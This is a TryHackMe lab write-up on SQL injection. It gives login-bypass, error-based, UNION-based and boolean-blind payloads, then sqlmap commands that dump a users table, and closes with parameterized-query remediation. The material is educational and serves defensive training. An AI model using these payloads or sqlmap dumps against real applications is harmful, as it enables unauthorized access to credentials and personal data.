# SQL Injection — Writeup

**Platform:** TryHackMe  
**Category:** Web Application Security  
**Difficulty:** Medium  
**Vulnerability Type:** SQL Injection (In-band, Blind, Error-Based)  
**OWASP Category:** Injection (A03:2021)  

---

## Vulnerability Overview

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. A successful attack can allow an attacker to:

- View data they are not authorized to access
- Modify or delete database data
- Bypass authentication
- In some cases, execute OS commands on the database server

SQLi is ranked **#3 in the OWASP Top 10 (2021)** and remains one of the most critical and common web vulnerabilities.

---

## Target Overview

The target was a web application with a login form and search functionality that passed user input directly into SQL queries without sanitization — making it vulnerable to multiple categories of SQL Injection.

---

## Reconnaissance

Identified input fields that interact with the database:
- Login form (username/password fields)
- Search/query parameter in the URL

Tested basic SQLi payloads to confirm vulnerability:

```
' OR 1=1 --
' AND '1'='1
' ; --
```

The application returned a database error on the first test — confirming the input was being passed directly into a SQL query.

---

## Exploitation

### Category 1 — Error-Based SQL Injection (Manual)

Submitted a malformed SQL payload to trigger a database error and extract information from the error message:

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
```

The database error response revealed:
- Database version
- Table structure hints

### Category 2 — In-Band SQL Injection (Manual — UNION Based)

Used UNION-based injection to extract data directly in the HTTP response.

**Step 1:** Determine number of columns:

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

Found 3 columns when no error was returned.

**Step 2:** Identify which columns display output:

```sql
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 'a', NULL, NULL --
```

**Step 3:** Extract database name and tables:

```sql
' UNION SELECT database(), NULL, NULL --
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() --
```

**Step 4:** Extract column names and dump data:

```sql
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username, password, NULL FROM users --
```

**Complete database dump achieved manually.**

### Category 3 — Blind SQL Injection

When the application did not display errors or output, used boolean-based blind injection:

```sql
' AND 1=1 --   (True — normal response)
' AND 1=2 --   (False — different response)
```

Response differences confirmed blind SQLi — data could be extracted character by character.

### Category 4 — Automated Exploitation with SQLMap

After manual confirmation, used SQLMap to automate the full database dump:

```bash
# Basic scan
sqlmap -u "http://<target-ip>/search?q=test" --dbs

# Dump all tables from target database
sqlmap -u "http://<target-ip>/search?q=test" -D target_db --tables

# Dump users table
sqlmap -u "http://<target-ip>/search?q=test" -D target_db -T users --dump
```

SQLMap successfully dumped the complete database including usernames and password hashes.

---

## Why This Works

The vulnerable backend code looked something like this:

```python
# Vulnerable
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)
```

User input was concatenated directly into the SQL query string. This allowed injecting SQL syntax that changed the query's logic entirely.

```
User Input: ' OR 1=1 --
        │
        ▼
Query becomes: SELECT * FROM users WHERE username = '' OR 1=1 --'
        │
        ▼
1=1 is always TRUE → returns all users
        │
        ▼
Authentication bypassed / full data returned
```

---

## Real-World Impact

A successful SQL Injection attack on a production application can result in:

- Full database dump (usernames, passwords, PII, financial data)
- Authentication bypass (login as any user including admin)
- Data modification or deletion
- In some configurations — OS command execution via `xp_cmdshell` (MSSQL) or `INTO OUTFILE` (MySQL)
- Complete application and server compromise

---

## Remediation

| Action | Details |
|--------|---------|
| Prepared Statements | Use parameterized queries — never concatenate user input into SQL |
| ORM Usage | Use Object-Relational Mappers that handle query building securely |
| Input Validation | Whitelist expected input types and reject unexpected characters |
| Least Privilege | Database user should only have permissions it needs — no DROP or admin rights |
| WAF | Deploy a Web Application Firewall to detect and block SQLi patterns |
| Error Handling | Never expose raw database errors to end users |

**Secure Code Example:**

```python
# Vulnerable
query = "SELECT * FROM users WHERE username = '" + username + "'"

# Secure — Parameterized Query
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

---

## Key Takeaways

- Always test every input field, URL parameter, and HTTP header for SQL Injection.
- Manual testing reveals understanding; SQLMap confirms and automates — use both.
- Error messages are gold — they can reveal database type, version, and table names.
- Blind SQLi requires patience but is equally dangerous as in-band injection.
- SQL Injection is decades old but still among the most commonly found vulnerabilities in real-world pentests.

---

*Written by Muhammad Muzammil Khan — Penetration Tester*  
*TryHackMe Profile: https://tryhackme.com/r/p/mmuzammilkhan*
